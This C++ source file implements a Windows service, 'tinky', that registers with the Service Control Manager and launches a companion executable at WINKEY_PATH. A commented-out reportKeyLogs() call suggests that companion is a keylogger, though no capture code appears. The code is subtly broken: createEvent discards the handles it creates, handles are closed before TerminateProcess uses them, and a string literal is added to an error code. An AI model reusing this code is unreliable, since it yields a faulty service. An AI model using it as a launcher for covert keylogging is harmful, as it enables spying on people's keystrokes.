#include "tinky.hpp"
#include "utils.hpp"

using namespace std;

extern tinky_t tinky;


static void sendStatus(DWORD currentState, DWORD ctrlsAccepted) {
	tinky.svcStatus.dwCurrentState = currentState;
	tinky.svcStatus.dwControlsAccepted = ctrlsAccepted;
	
	SetServiceStatus(tinky.svcStatusHandle, &tinky.svcStatus);
}

static void stopTinkyWinkey(void) {
	SetEvent(tinky.tinkyStopEventHandle);
	SetEvent(tinky.winkeyStopEventHandle);
	if (tinky.processInfo.hProcess)
		CloseHandle(tinky.processInfo.hProcess);
	if (tinky.processInfo.hThread)
		CloseHandle(tinky.processInfo.hThread);
	if (!TerminateProcess(tinky.processInfo.hProcess, NONE)) {
		char buffer[16] = {};
		itoa((int)GetLastError(), buffer, 16);
		journalReport(string (string("Terminate process failed with code:") + string(buffer) + string("\n")).c_str());
	}
	sendStatus(SERVICE_STOPPED, NONE);
}

/* https://learn.microsoft.com/fr-fr/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex */
DWORD WINAPI controlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	// TODO s
	// Handle SERVICE_CONTROL_PAUSE ?
	// Handle SERVICE_CONTROL_SESSIONCHANGE !
	switch(dwControl) {
		case (SERVICE_CONTROL_INTERROGATE):
			return (NO_ERROR);
		case (SERVICE_CONTROL_STOP):
			stopTinkyWinkey();
			return (NO_ERROR);
		case (SERVICE_CONTROL_SHUTDOWN):
			//reportKeyLogs();
			stopTinkyWinkey();
			return (NO_ERROR);
	}
	(void)dwEventType; // Event type, handle only if dwControl == SERVICE_CONTROL_SESSIONCHANGE
	(void)lpEventData; // Same as above
	(void)lpContext; // Same as RegisterServiceCtrlHandlerEx lpContext (void* user data)
	return (ERROR_CALL_NOT_IMPLEMENTED);
}

static void registerControlHandler(void) {
	tinky.svcStatusHandle = RegisterServiceCtrlHandlerExA(
				SVC_NAME,
				&controlHandler,
				NULL
			);
}

static void createEvent(HANDLE handle, const char *eventName) {
	handle = CreateEventA(
		NULL,
		FALSE,
		FALSE,
		eventName
	);
}

static BYTE launchProcess(const char *processPath) {
	if (!CreateProcessA(
		processPath, // GetCurrentDirectory() ?
		NULL,
		NULL, NULL,
		FALSE,
		0, NULL, NULL,
		&tinky.startupInfo,
		&tinky.processInfo
	)) {
		journalReport("Service failed to launch\n");
		return (FAILURE);
	}
	journalReport("Process launched\n");
	return (SUCCESS);
}

static BYTE initService(void) {
	registerControlHandler();
	tinky.svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	sendStatus(SERVICE_START_PENDING, NONE);

	createEvent(tinky.winkeyStopEventHandle, WINKEY_STOP);
	createEvent(tinky.tinkyStopEventHandle, NO_NAME);
	return (SUCCESS);
}

/* WINAPI ServiceMain() */
VOID WINAPI serviceMain(DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors) {
	if (!initService())
		return ;

	if (!launchProcess(WINKEY_PATH)) {

		sendStatus(SERVICE_STOPPED, NONE);
		return ;

	} else {

		sendStatus(SERVICE_RUNNING, SERVICE_ACCEPT_STOP);

		while (true) {

			WaitForSingleObject(tinky.tinkyStopEventHandle, INFINITE);
			journalReport(string("Process tinky stop event\n").c_str());
			return ;

		}
	}
	(void)dwNumServicesArgs, (void)lpServiceArgVectors;
}

/* SERVICE_TABLE_ENTRY = array of services (name + funcptr) */
static void initTableEntry(SERVICE_TABLE_ENTRYA svcTableEntry[]) {
	svcTableEntry[0].lpServiceName = SVC_NAME;
	svcTableEntry[0].lpServiceProc = &serviceMain;

	svcTableEntry[1].lpServiceName = NULL;
	svcTableEntry[1].lpServiceProc = NULL;
}

/* https://learn.microsoft.com/fr-fr/windows/win32/services/service-entry-point */
int startedBySCM(void) {
	journalReport("Entering start\n");
	SERVICE_TABLE_ENTRYA svcTableEntry[2] = {};

	initTableEntry(svcTableEntry);
	if (!StartServiceCtrlDispatcherA(svcTableEntry)) {

		journalReport(string("Error while StartServiceCtrl" + GetLastError() + '\n').c_str());

		DWORD lastErr = GetLastError();
		switch (lastErr) {
			case (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT):
				printUsage();
				break ;
			case (ERROR_INVALID_DATA):
				cerr << "Invalid svcTableEntry data\n"; // These must be signal sending ?
				break ;
			case (ERROR_SERVICE_ALREADY_RUNNING):
				cerr << "Service is already running\n"; // These must be signal sending ?
				break ;
		}
		return (FAILURE);
	}
	return (SUCCESS);
}